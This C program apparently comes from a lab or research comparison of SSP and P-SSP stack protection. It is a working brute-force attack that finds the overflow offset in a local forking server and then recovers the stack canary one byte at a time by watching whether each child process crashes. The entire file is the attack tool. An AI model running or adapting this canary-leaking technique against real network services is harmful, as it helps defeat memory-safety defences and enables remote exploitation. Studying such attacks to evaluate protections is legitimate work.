#include<stdio.h> 
#include<stdlib.h> 
#include<sys/wait.h> 
#include<unistd.h> 
#include <arpa/inet.h> 
#include<string.h>

//#define PORT (8080)
#define ARRAY_SIZE (100)
#define CANARY_SIZE (10)

int createChild(char *input) {
	pid_t cpid; 
    int status;
	char *args[] = {"./vuln", input, NULL};
    if (fork()== 0) {
	    execvp(args[0], args);
		exit(0);
    } else {
        cpid = wait(&status); 
		if (WIFSIGNALED(status)) {
    		if (WTERMSIG(status) == SIGSEGV){
				// on seg fault
				return 1;
			} else if (WTERMSIG(status) == SIGABRT) {
				// on stack smashing detected
				return 2;
			}
		}
		return 0;
	}	
}

int connectAndSend(int sock, struct sockaddr_in serverAddress, char *input, int length) {
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
		printf("\n Socket creation error \n"); 
		return -1; 
	} 
	if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) { 
		printf("\nConnection Failed \n"); 
		return -1; 
	} 
	send(sock , input , length, 0 ); 
	char buffer[64] = {0};

	// return the status of the connection
	int val = read( sock , buffer, 64);
	return !val;

}

// get how many bytes we need to send in order to trigger
// a stack smashing detection
int getSmashLocation(int sock, struct sockaddr_in serverAddress, char *input) {
	int i = 0;
	int childStatus = 0;
	while (childStatus == 0 && i < ARRAY_SIZE) {
		input[i] = 'a';
		childStatus = connectAndSend(sock, serverAddress, input, i + 1);
		i++;
		printf("%d\n", i);
	}

	printf("Seg fault location: %d\n", i);
	return i;

}

// determine the next byte of the canary
int getOneByte(int sock, struct sockaddr_in serverAddress, char *input, int idx) {

	// c will loop around to 0 when it is done
	for (unsigned char c = 1; c > 0; c++) {
		input[idx] = c;

		// happens if the child doesn't die
		int childStatus = connectAndSend(sock, serverAddress, input, idx + 1);
		if (!childStatus) {
			return (int) c;
		}
		//printf("Failed byte: %d\n", c);

	}

	// we were unable to get the next byte of the canary
	return -1;
}

int main(int argc, char const *argv[]) {
	int sock = 0; 
	struct sockaddr_in serverAddress; 
	char buffer[1024] = {0}; 
	if (argc < 2) {
		printf("Please specify port. 8080 for SSP and 1234 for P-SSP");
		return 1;
	}
	char *endptr;
	long PORT = strtoll(argv[1], &endptr, 10);
   
	serverAddress.sin_family = AF_INET; 
	serverAddress.sin_port = htons(PORT); 
	   
	// Convert IPv4 and IPv6 addresses from text to binary form 
	if(inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr)<=0) { 
		printf("\nInvalid address/ Address not supported \n"); 
		return -1; 
	}
	
	unsigned char input[ARRAY_SIZE];
	for (int i = 0; i < ARRAY_SIZE; i++) {
		input[i] = '\0';
	}
	int smashLoc = getSmashLocation(sock, serverAddress, input);
	input[smashLoc - 1] = '\0';
	
	char canary[CANARY_SIZE];	
	for (int i = 0; i < CANARY_SIZE; i++) {
		int byte = getOneByte(sock, serverAddress, input, i + smashLoc);
		printf("Next byte: %d\n", byte);
		if (byte == -1) {
			printf("Could not get canary byte @ idx=%d\n", i);
			return 0;
		}
		canary[i] = byte;
	}

	printf("Canary string: %s\n", canary);
  
    return 0; 
}

